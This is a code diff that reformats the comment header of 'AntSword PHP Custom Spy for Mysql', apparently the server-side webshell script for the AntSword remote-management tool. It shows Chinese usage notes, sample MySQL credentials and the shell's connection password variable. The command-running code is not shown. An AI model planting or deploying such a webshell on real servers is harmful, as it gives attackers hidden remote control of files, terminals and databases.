@@ -1,31 +1,31 @@
 <?php
 /**
-             _   ____                       _
-  __ _ _ __ | |_/ ___|_      _____  _ __ __| |
- / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
-| (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
- \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
-———————————————————————————————————————————————
-    AntSword PHP Custom Spy for Mysql
-                    Author:Medici.Yan
-———————————————————————————————————————————————
-
-使用说明：
- 1. AntSword >= v1.1-dev
- 2. 创建 Shell 时选择 custom 模式连接
- 3. 数据库连接：
-    <H>localhost</H>
-    <U>root</U>
-    <P>123456</P>
-
- 4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
-
-ChangeLog:
-
-  Date: 2016/04/06 v1.0
-   1. 文件系统 和 terminal 管理
-   2. mysql 数据库支持
-   3. 支持 base64 和 hex 编码
+*              _   ____                       _
+*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
+*  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
+* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
+*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
+* ———————————————————————————————————————————————
+*     AntSword PHP Custom Spy for Mysql
+*                     Author:Medici.Yan
+* ———————————————————————————————————————————————
+*
+* 使用说明：
+*  1. AntSword >= v1.1-dev
+*  2. 创建 Shell 时选择 custom 模式连接
+*  3. 数据库连接：
+*    <H>localhost</H>
+*    <U>root</U>
+*    <P>123456</P>
+*
+*  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
+*
+* ChangeLog:
+* 
+*   Date: 2016/04/06 v1.0
+*    1. 文件系统 和 terminal 管理
+*    2. mysql 数据库支持
+*    3. 支持 base64 和 hex 编码
 **/
 
 $pwd = "ant"; //连接密码
@@ -36,7 +36,7 @@ $encoder = ""; // default
 $cs = "UTF-8";
 
 /**
-字符编码处理
+* 字符编码处理
 **/
 function EC($s){
     global $cs;
